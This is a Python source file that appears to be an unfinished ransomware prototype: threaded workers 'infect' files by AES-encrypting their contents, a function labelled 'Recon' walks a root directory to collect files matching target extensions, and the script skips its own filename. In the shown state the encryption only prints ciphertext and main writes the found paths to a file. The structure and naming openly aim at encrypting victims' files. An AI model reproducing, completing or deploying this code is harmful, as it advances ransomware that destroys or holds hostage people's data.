import os
import sys
from queue import Queue
from threading import Thread

import Utils
sys.path.append(os.path.abspath('../hasp'))
from AESCipher import AESCipher
class APTAl(Thread):
    def __init__(self,filelist,aeskey):
        Thread.__init__(self)
        self.file_list = filelist
        self.aes_key = aeskey
    
    def run(self):
        while True:
            innocent_file_path = self.file_list.get()
            try:
                self.infect(innocent_file_path)
            finally:
                self.file_list.task_done()

    def infect(self,path):
        cipher = AESCipher(self.aes_key)
        encrypted_text = cipher.encrypt(open(path,"r").read())
        print("Encrypted::",encrypted_text)
        decrypted_text = cipher.decrypt(encrypted_text)
        print("Decrypted::",decrypted_text)

def isInTargetFiles(_extention):
    """
        Binary Search to find extentions in the target files
    """
    left = 0
    right = len(Utils.file_extentions) - 1

    while left <= right:
        mid = (left + right)// 2
        current = Utils.file_extentions[mid]
        if current  > _extention:
            right = mid - 1
        elif current  < _extention:
            left = mid + 1
        else:
            return True
    return False

def isValidFile(file_path):
    """
        Determining whether the file is valid or not
    """
    if file_path != Utils.whatismyname:
        _extention = file_path.split(".")[-1]
        if len(_extention) == 1 or isInTargetFiles(_extention):
            return True
    return False

def findFiles(path):
    """
        Recon
    """
    _goodbye_files = []
    for directory_path, directories, files in os.walk(path):
        for fiile in files:
            if isValidFile(fiile):
                _goodbye_files.append(os.path.join(directory_path,fiile))
    return _goodbye_files

def main():
    """
    TODO Async -> File Explorer and Encryption
    """
    _temp_file = open("aes_iv.txt","w")
    found_files = findFiles(Utils.root_directory)
    for ff in found_files:
        print(ff,file=_temp_file)
    print("DONE")
    

if __name__ == "__main__":
    main()